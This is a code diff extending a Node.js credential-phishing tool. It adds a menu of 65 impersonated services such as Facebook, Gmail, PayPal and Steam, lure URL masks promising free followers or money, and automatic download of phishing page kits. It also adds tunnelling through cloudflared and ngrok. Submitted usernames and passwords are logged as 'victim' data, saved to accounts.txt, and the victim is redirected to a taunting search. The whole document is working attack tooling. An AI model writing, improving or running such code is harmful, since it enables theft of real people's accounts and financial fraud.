@@ -35,7 +35,7 @@ const short = require("./short");
 const path = require("path");
 const fs = require("fs");
 
-const VERSION = "1.2.1";
+const VERSION = "1.3";
 const isTermux = process.platform === "android";
 const isLinux = process.platform === "linux" || isTermux;
 const logAsk = chalk.greenBright`[{whiteBright ?}]`;
@@ -57,6 +57,73 @@ const logLogo =
 
 console.clear();
 console.log(logLogo);
+const availableSites = [
+	"Facebook Traditional",
+	"Facebook Voting",
+	"Facebook Security",
+	"Messenger",
+	"Instagram Traditional",
+	"Insta Auto Followers",
+	"Insta 1000 Followers",
+	"Insta Blue Verify",
+	"Gmail Old",
+	"Gmail New",
+	"Gmail Poll",
+	"Microsoft",
+	"Netflix",
+	"Paypal",
+	"Steam",
+	"Twitter",
+	"PlayStation",
+	"TikTok",
+	"Twitch",
+	"Pinterest",
+	"SnapChat",
+	"LinkedIn",
+	"Ebay",
+	"Quora",
+	"Protonmail",
+	"Spotify",
+	"Reddit",
+	"Adobe",
+	"DevianArt",
+	"Badoo",
+	"Clash Of Clans",
+	"Ajio",
+	"JioRouter",
+	"FreeFire",
+	"Pubg",
+	"Telegram",
+	"Youtube",
+	"Airtel",
+	"SocialClub",
+	"Ola",
+	"Outlook",
+	"Amazon",
+	"Origin",
+	"DropBox",
+	"Yahoo",
+	"WordPress",
+	"Yandex",
+	"StackOverflow",
+	"VK",
+	"VK Poll",
+	"Xbox",
+	"Mediafire",
+	"Gitlab",
+	"Github",
+	"Apple",
+	"iCloud",
+	"Shopify",
+	"Myspace",
+	"Shopping",
+	"Cryptocurrency",
+	"SnapChat2",
+	"Verizon",
+	"Wi-Fi",
+	"Discord",
+	"Roblox",
+];
 const loggedIps = [];
 if (process.platform === "darwin") {
 	console.log(chalk.redBright`${logError} You are running on a Mac. This is not supported.`);
@@ -70,6 +137,9 @@ app.disable("x-powered-by");
 (async () => {
 	await controlVersion().catch(throwError);
 	await installRequirements().catch(throwError);
+	const selectedSite = await selectSite().catch(throwError);
+	console.clear();
+	console.log(logLogo);
 	if (isTermux) {
 		console.log(chalk.magenta`${logInfo} If you haven't enabled hotspot, please enable it!\n`);
 		await new Promise(r => setTimeout(r, 1000));
@@ -89,11 +159,11 @@ app.disable("x-powered-by");
 	if (!isTermux) {
 		console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
 		console.log(chalk.magenta`${logInfo2} URL 1 > {yellowBright ${cloudflared}}\n`);
-		console.log(chalk.magenta`${logInfo2} URL 2 > {yellowBright ${shortCf.split("/")[0] + "//google.com-instagram-1000@" + shortCf.split("/").slice(2).join("/")}}\n\n`);
+		console.log(chalk.magenta`${logInfo2} URL 2 > {yellowBright ${selectedSite.mask + "@" + shortCf.split("/").slice(2).join("/")}}\n\n`);
 	}
 	console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
 	console.log(chalk.magenta`${logInfo2} URL ${isTermux ? "1" : "3"} > {yellowBright ${ngrok}}\n`);
-	console.log(chalk.magenta`${logInfo2} URL ${isTermux ? "1" : "4"} > {yellowBright ${shortNgrok.split("/")[0] + "//google.com-instagram-1000@" + shortNgrok.split("/").slice(2).join("/")}}\n`);
+	console.log(chalk.magenta`${logInfo2} URL ${isTermux ? "1" : "4"} > {yellowBright ${selectedSite.mask + "@" + shortNgrok.split("/").slice(2).join("/")}}\n`);
 	console.log(chalk.cyan`${logInfo} Waiting for ip info... {cyanBright Press {red Ctrl+C} to exit}`);
 	if (process.platform === "win32") {
 		require("readline")
@@ -134,21 +204,17 @@ app.all("/", async (req, res) => {
 	}
 });
 
-app.get("/login", (_req, res) => {
-	res.sendFile(path.join(__dirname, "bin", "instagram", "login.html"));
-});
-
-app.post("/login", (req, res) => {
+app.post(["/login", "/login.php"], (req, res) => {
 	const { username, password } = req.body;
 	if (!username?.trim?.() || !password?.trim?.()) {
 		res.redirect("/login");
 		return;
 	}
-	res.redirect("https://instagram.com");
+	res.redirect("https://www.google.com/search?q=How+can+I+get+my+stolen+account+back+%3B%29");
 	console.log(chalk.greenBright`${logSuccess} Victim login info found!\n`);
 
-	console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Instagram Username:  ${username}`);
-	console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Instagram Password:  ${password}\n`);
+	console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} User Username:  ${username}`);
+	console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} User Password:  ${password}\n`);
 
 	fs.appendFileSync("./accounts.txt", `${username}:${password}\n`);
 	console.log(chalk.cyan`${logInfo} Saved in accounts.txt\n`);
@@ -214,6 +280,7 @@ function installRequirements() {
 	return new Promise(async (resolve, reject) => {
 		console.clear();
 		console.log(logLogo);
+		//! Cloudflared
 		if (!fs.existsSync(path.join(__dirname, "bin", `cloudflared${!isLinux ? ".exe" : ""}`))) {
 			console.log(chalk.yellow`${logInfo2} Downloading cloudflared...`);
 			const cloudflaredLink = `https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-${isLinux ? `linux-${getArch()}.deb` : "windows-386.exe"}`;
@@ -228,6 +295,7 @@ function installRequirements() {
 				console.log(chalk.yellow`${logInfo} Please download it manually\n`);
 			}
 		}
+		//! Ngrok
 		if (!fs.existsSync(path.join(__dirname, "bin", `ngrok${!isLinux ? ".exe" : ""}`))) {
 			console.log(chalk.yellow`${logInfo2} Downloading ngrok...`);
 			const ngrokLink = `https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-${isLinux ? `linux-${getArch()}.tgz` : "windows-386.zip"}`;
@@ -246,19 +314,6 @@ function installRequirements() {
 			} catch {
 				console.log(chalk.redBright`${logError} Failed to download ngrok!\n`);
 				console.log(chalk.yellow`${logInfo} Please download it manually\n`);
-			}
-		}
-		if (fs.existsSync(path.join(__dirname, "bin", "instagram.zip"))) {
-			console.log(chalk.yellow`${logInfo2} Extracting instagram...`);
-			try {
-				new AdmZip(path.join(__dirname, "bin", "instagram.zip")).extractAllTo(path.join(__dirname, "bin", "instagram"), true);
-				console.log(chalk.yellow`${logSuccess} Extracted!\n`);
-				console.log(chalk.yellow`${logInfo2} Removing zip file...`);
-				fs.unlinkSync(path.join(__dirname, "bin", "instagram.zip"));
-				console.log(chalk.yellow`${logSuccess} Removed!\n`);
-			} catch {
-				console.log(chalk.redBright`${logError} Failed to extract instagram!\n`);
-				console.log(chalk.yellow`${logInfo} Please extract it manually\n`);
 			}
 		}
 		resolve();
@@ -325,4 +380,260 @@ function onExit(withoutLog = false) {
 function throwError(error) {
 	console.log(chalk.redBright`${logError} ${error}\n`);
 	onExit(true);
+}
+
+function selectSite() {
+	return new Promise(async (resolve, reject) => {
+		availableSites.forEach((site, index) => {
+			const maxLength = Math.max(...availableSites.map(s => s.length)) + 10;
+			let spacing = " ".repeat(maxLength);
+			spacing = spacing.substring(0, maxLength - site.length);
+			spacing = ((index + 1) / 3) % 1 === 0 ? "\n" : spacing;
+			process.stdout.write(chalk.yellowBright`{greenBright [}{whiteBright ${index + 1 < 10 ? "0" + (index + 1) : index + 1}}{greenBright ]} ${site}${spacing}`);
+		});
+		console.log(chalk.yellowBright`\n\n{greenBright [}{whiteBright 0}{greenBright ]} Exit\n`);
+		const choose = readlineSync.prompt({ prompt: chalk.yellowBright`${logAsk} Select one of the options > ` });
+		let folder;
+		let mask;
+		if (choose == "1" || choose == "01") {
+			folder = "facebook";
+			mask = "https://blue-verified-facebook-free";
+		} else if (choose === "2" || choose == "02") {
+			folder = "fb_advanced";
+			mask = "https://vote-for-the-best-social-media";
+		} else if (choose === "3" || choose == "03") {
+			folder = "fb_security";
+			mask = "https://make-your-facebook-secured-and-free-from-hackers";
+		} else if (choose === "4" || choose == "04") {
+			folder = "fb_messenger";
+			mask = "https://get-messenger-premium-features-free";
+		} else if (choose === "5" || choose == "05") {
+			folder = "instagram";
+			mask = "https://get-unlimited-followers-for-instagram";
+		} else if (choose === "6" || choose == "06") {
+			folder = "ig_followers";
+			mask = "https://get-unlimited-followers-for-instagram";
+		} else if (choose === "7" || choose == "07") {
+			folder = "insta_followers";
+			mask = "https://get-1000-followers-for-instagram";
+		} else if (choose === "8" || choose == "08") {
+			folder = "ig_verify";
+			mask = "https://blue-badge-verify-for-instagram-free";
+		} else if (choose === "9" || choose == "09") {
+			folder = "google";
+			mask = "https://get-unlimited-google-drive-free";
+		} else if (choose === "10") {
+			folder = "google_new";
+			mask = "https://get-unlimited-google-drive-free";
+		} else if (choose === "11") {
+			folder = "google_poll";
+			mask = "https://vote-for-the-best-social-media";
+		} else if (choose === "12") {
+			folder = "microsoft";
+			mask = "https://unlimited-onedrive-space-for-free";
+		} else if (choose === "13") {
+			folder = "netflix";
+			mask = "https://upgrade-your-netflix-plan-free";
+		} else if (choose === "14") {
+			folder = "paypal";
+			mask = "https://get-500-usd-free-to-your-account";
+		} else if (choose === "15") {
+			folder = "steam";
+			mask = "https://steam-500-usd-gift-card-free";
+		} else if (choose === "16") {
+			folder = "twitter";
+			mask = "https://get-blue-badge-on-twitter-free";
+		} else if (choose === "17") {
+			folder = "playstation";
+			mask = "https://playstation-500-usd-gift-card-free";
+		} else if (choose === "18") {
+			folder = "tiktok";
+			mask = "https://tiktok-free-liker";
+		} else if (choose === "19") {
+			folder = "twitch";
+			mask = "https://unlimited-twitch-tv-user-for-free";
+		} else if (choose === "20") {
+			folder = "pinterest";
+			mask = "https://get-a-premium-plan-for-pinterest-free";
+		} else if (choose === "21") {
+			folder = "snapchat";
+			mask = "https://view-locked-snapchat-accounts-secretly";
+		} else if (choose === "22") {
+			folder = "linkedin";
+			mask = "https://get-a-premium-plan-for-linkedin-free";
+		} else if (choose === "23") {
+			folder = "ebay";
+			mask = "https://get-500-usd-free-to-your-account";
+		} else if (choose === "24") {
+			folder = "quora";
+			mask = "https://quora-premium-for-free";
+		} else if (choose === "25") {
+			folder = "protonmail";
+			mask = "https://protonmail-pro-basics-for-free";
+		} else if (choose === "26") {
+			folder = "spotify";
+			mask = "https://convert-your-account-to-spotify-premium";
+		} else if (choose === "27") {
+			folder = "reddit";
+			mask = "https://reddit-official-verified-member-badge";
+		} else if (choose === "28") {
+			folder = "adobe";
+			mask = "https://get-adobe-lifetime-pro-membership-free";
+		} else if (choose === "29") {
+			folder = "deviantart";
+			mask = "https://get-500-usd-free-to-your-acount";
+		} else if (choose === "30") {
+			folder = "badoo";
+			mask = "https://get-500-usd-free-to-your-acount";
+		} else if (choose === "31") {
+			folder = "clashofclans";
+			mask = "https://get-unlimited-gems-in-your-coc-account";
+		} else if (choose === "32") {
+			folder = "ajio";
+			mask = "https://get-limited-time-discount";
+		} else if (choose === "33") {
+			folder = "jiorouter";
+			mask = "https://get-premium-membership-free";
+		} else if (choose === "34") {
+			folder = "freefire";
+			mask = "https://get-unlimited-diamonds-in-your-ff-account";
+		} else if (choose === "35") {
+			folder = "pubg";
+			mask = "https://get-unlimited-diamonds-in-your-pubg-account";
+		} else if (choose === "36") {
+			folder = "telegram";
+			mask = "https://get-premium-membership-free";
+		} else if (choose === "37") {
+			folder = "youtube";
+			mask = "https://get-1k-like-in-any-video";
+		} else if (choose === "38") {
+			folder = "airtelsim";
+			mask = "https://get-500-cureency-free-to-your-account";
+		} else if (choose === "39") {
+			folder = "socialclub";
+			mask = "https://get-premium-membership-free";
+		} else if (choose === "40") {
+			folder = "ola";
+			mask = "https://book-a-cab-in-discount";
+		} else if (choose === "41") {
+			folder = "outlook";
+			mask = "https://grab-mail-from-anyother-outlook-account-free";
+		} else if (choose === "42") {
+			folder = "amazon";
+			mask = "https://get-limited-time-discount-free";
+		} else if (choose === "43") {
+			folder = "origin";
+			mask = "https://get-500-usd-free-to-your-acount";
+		} else if (choose === "44") {
+			folder = "dropbox";
+			mask = "https://get-1TB-cloud-storage-free";
+		} else if (choose === "45") {
+			folder = "yahoo";
+			mask = "https://grab-mail-from-anyother-yahoo-account-free";
+		} else if (choose === "46") {
+			folder = "wordpress";
+			mask = "https://unlimited-wordpress-traffic-free";
+		} else if (choose === "47") {
+			folder = "yandex";
+			mask = "https://grab-mail-from-anyother-yandex-account-free";
+		} else if (choose === "48") {
+			folder = "stackoverflow";
+			mask = "https://get-stackoverflow-lifetime-pro-membership-free";
+		} else if (choose === "49") {
+			folder = "vk";
+			mask = "https://vk-premium-real-method-2020";
+		} else if (choose === "50") {
+			folder = "vk_pole";
+			mask = "https://vote-for-the-best-social-media";
+		} else if (choose === "51") {
+			folder = "xbox";
+			mask = "https://get-500-usd-free-to-your-acount";
+		} else if (choose === "52") {
+			folder = "mediafire";
+			mask = "https://get-1TB-on-mediafire-free";
+		} else if (choose === "53") {
+			folder = "gitlab";
+			mask = "https://get-1k-followers-on-gitlab-free";
+		} else if (choose === "54") {
+			folder = "github";
+			mask = "https://get-1k-followers-on-github-free";
+		} else if (choose === "55") {
+			folder = "apple";
+			mask = "https://get-apple-premium-account-free";
+		} else if (choose === "56") {
+			folder = "icloud";
+			mask = "https://unlimited-storage-icloud-free";
+		} else if (choose === "57") {
+			folder = "shopify";
+			mask = "https://get-50%-discount-on-any-sale";
+		} else if (choose === "58") {
+			folder = "myspace";
+			mask = "https://get-1k-followers-on-myspace-free-free";
+		} else if (choose === "59") {
+			folder = "shopping";
+			mask = "https://get-50%-discount-on-any-sale";
+		} else if (choose === "60") {
+			folder = "cryptocurrency";
+			mask = "https://get-bitcoins-free";
+		} else if (choose === "61") {
+			folder = "snapchat2";
+			mask = "https://view-locked-snapchat-accounts-secretly";
+		} else if (choose === "62") {
+			folder = "verizon";
+			mask = "https://get-verizon-premium-account-free";
+		} else if (choose === "63") {
+			folder = "wifi";
+			mask = "https://reconnect-your-wifi";
+		} else if (choose === "64") {
+			folder = "discord";
+			mask = "https://security-bot-for-your-discord-free";
+		} else if (choose === "65") {
+			folder = "roblox";
+			mask = "https://play-premium-games-for-free";
+		} else if (choose == "0") {
+			onExit(true);
+		} else {
+			console.clear();
+			console.log(chalk.redBright`${logError} Invalid input.`);
+			selectSite();
+			return;
+		}
+		await downloadSites(folder);
+		resolve({ site: folder, mask });
+		app.get("/login", (_req, res) => {
+			res.sendFile(path.join(__dirname, "bin", "websites", folder, "login.html"));
+		});
+	});
+}
+
+function downloadSites(folder) {
+	return new Promise(async resolve => {
+		if (!fs.existsSync(path.join(__dirname, "bin", "websites", folder))) {
+			console.log(chalk.yellowBright(`${logInfo} Downloading required files...`));
+			try {
+				if (!fs.existsSync(path.join(__dirname, "bin", "websites"))) {
+					console.log(chalk.yellowBright(`${logInfo} Creating folder...`));
+					fs.mkdirSync(path.join(__dirname, "bin", "websites"));
+				}
+				fs.writeFileSync(path.join(__dirname, "bin", "websites", folder + ".zip"), await downloader(`https://github.com/KasRoudra/files/raw/main/phishingsites/${folder}.zip`).catch(throwError));
+				console.log(chalk.greenBright(`${logSuccess} Downloaded successfully.`));
+				console.log(chalk.yellowBright(`${logInfo} Extracting files...`));
+				new AdmZip(path.join(__dirname, "bin", "websites", folder + ".zip")).extractAllTo(path.join(__dirname, "bin", "websites", folder), true);
+				console.log(chalk.greenBright(`${logSuccess} Extracted successfully.`));
+				console.log(chalk.yellowBright(`${logInfo} Deleting unnecessary files...`));
+				fs.unlinkSync(path.join(__dirname, "bin", "websites", folder + ".zip"));
+				fs.readdirSync(path.join(__dirname, "bin", "websites", folder)).forEach(file => {
+					if (!file.endsWith(".php")) {
+						return;
+					}
+					fs.unlinkSync(path.join(__dirname, "bin", "websites", folder, file));
+				});
+				console.log(chalk.greenBright(`${logSuccess} Deleted successfully.`));
+			} catch (error) {
+				console.log(chalk.redBright(`${logError} ${error}`));
+				onExit(true);
+			}
+		}
+		resolve();
+	});
 }
